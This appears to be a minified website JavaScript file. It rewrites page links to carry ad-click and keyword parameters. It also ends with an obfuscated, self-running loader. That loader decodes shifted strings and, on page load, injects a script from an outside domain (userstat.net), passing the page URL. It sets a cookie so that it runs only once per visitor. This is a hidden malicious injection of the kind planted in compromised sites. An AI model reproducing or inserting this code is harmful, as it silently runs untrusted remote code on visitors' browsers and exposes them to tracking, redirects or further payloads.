document.addEventListener("DOMContentLoaded",(()=>{const searchParams=new URLSearchParams(window.location.search),links=document.querySelectorAll("a");let param="default",param_domain="",key="";searchParams.has("keyword")&&(key=searchParams.get("keyword")),searchParams.has("gclid")&&(param=searchParams.get("gclid"));const currentUrl=new URL(window.location.href);param_domain=currentUrl.hostname,Array.from(links).forEach((link=>{console.log("before",link.href);const newUrl=`${link.href}${param}&keyword=${key}&param_domain=${param_domain}`;link.setAttribute("href",newUrl),console.log("after",link.href)}))}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));